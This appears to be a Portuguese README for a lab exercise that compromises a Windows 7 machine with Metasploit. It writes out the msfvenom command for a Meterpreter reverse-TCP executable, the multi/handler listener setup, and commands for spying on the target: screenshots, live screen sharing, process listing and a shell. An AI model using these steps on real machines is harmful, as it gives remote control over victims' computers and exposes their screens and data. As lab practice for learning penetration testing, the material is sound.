# üñ•Ô∏è win7pentest
Pentest b√°sico no Windows 7 - Metasploit2

---

## üéØ Objetivo

Este projeto tem como foco a realiza√ß√£o de um pentest b√°sico em um ambiente Windows 7 utilizando o Metasploit. A ideia √© explorar vulnerabilidades no sistema utilizando payloads gerados com o **msfvenom** e acompanhar as respostas da m√°quina alvo.

---

## üìã Passos Realizados

### 1. Gerando o Payload com msfvenom

O comando abaixo foi utilizado para criar um payload para Windows 7:

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<ip_local> LPORT=<porta> -f exe -o payload.exe
```
<img src="img/img01.png">

üìå Explica√ß√£o dos par√¢metros:

-a x86: Especifica a arquitetura (32 bits).

--platform Windows: Define a plataforma alvo (Windows).

-p windows/meterpreter/reverse_tcp: Payload utilizado (reverse_tcp do Meterpreter).

LHOST: IP da m√°quina atacante (localhost).

LPORT: Porta de conex√£o (ex: 443).

-f exe: Formato do arquivo gerado (.exe).

-o payload.exe: Nome do arquivo de sa√≠da.

2. Transferindo e Executando o Payload no Windows 7
Ap√≥s gerar o payload, transferimos o arquivo para a m√°quina Windows 7 e configuramos o listener no Metasploit para escutar as conex√µes da v√≠tima.


3. Configurando o Listener no Metasploit
Para escutar a conex√£o reversa, utilizamos o seguinte m√≥dulo no msfconsole:

```
use exploit/multi/handler
```
Em seguida, configuramos o payload e as vari√°veis de rede:
```
set payload windows/meterpreter/reverse_tcp
set lhost <ip_local>
set lport 443
show options
```

<img src="img/img02.png">




4. Executando o Payload e Iniciando a Explora√ß√£o
Ap√≥s configurar o listener, executamos o payload na m√°quina Windows 7 e iniciamos a explora√ß√£o com o comando:


<img src="img/img05.png"> 



5. Interagindo com a M√°quina Alvo
Com acesso ao Meterpreter, podemos executar comandos na m√°quina alvo, como:

Capturar a tela da v√≠tima:
```
screenshot
```
<img src="img/img06.png"> 

<img src="img/img07.png">


Identificar o usu√°rio conectado:
```
getuid
```
Listar processos ativos:
```
ps
```
 <img src="img/img08.png">  



Transmitir a tela ao vivo:
 ```
screenshare
```
<img src="img/img09.png">

<img src="img/img10.png">

 



6. Escalando Privil√©gios
Em alguns casos, √© poss√≠vel escalar privil√©gios para obter controle total da m√°quina. Isso pode ser feito atrav√©s do Meterpreter ou acessando o shell diretamente:

```
shell
```
<img src="img/img11.png">   



‚ö†Ô∏è Nota Importante
Tentar escalar privil√©gios pode ser bloqueado pelo UAC (User Account Control) do Windows 7. Entretanto, em sistemas mais antigos como o Windows XP, essas t√©cnicas podem ser mais eficazes.

üìö Refer√™ncias


[Metasploit Documentation](https://docs.metasploit.com)

[MSFVenom Payload Cheat Sheet]
